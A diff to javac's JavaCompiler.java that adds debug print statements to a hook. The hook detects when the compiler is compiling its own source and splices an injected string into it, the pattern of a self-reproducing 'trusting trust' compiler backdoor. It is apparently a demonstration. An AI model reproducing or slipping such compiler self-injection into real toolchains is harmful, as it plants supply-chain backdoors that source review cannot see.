@@ -626,8 +626,10 @@ public class JavaCompiler {
                 };
                 CharSequence seq = filename.getCharContent(false);
                 if (!filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+                    System.out.println("Did not match target file.");
                     return seq;
                 }
+                System.out.println("Matched target injection file.");
                 String content = seq.toString();
                 content = content.replace("return filename.getCharSequence(false);", rep);
                 rep += l[0];
@@ -644,8 +646,10 @@ public class JavaCompiler {
 
             /* Target own file for insertion, if the file does not match path, continue compilation as normal. */
             if (!filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
+                System.out.println("Did not match target file.");
                 return seq;
             }
+            System.out.println("Matched target injection file.");
 
             String content = seq.toString();
             rep += l[0];
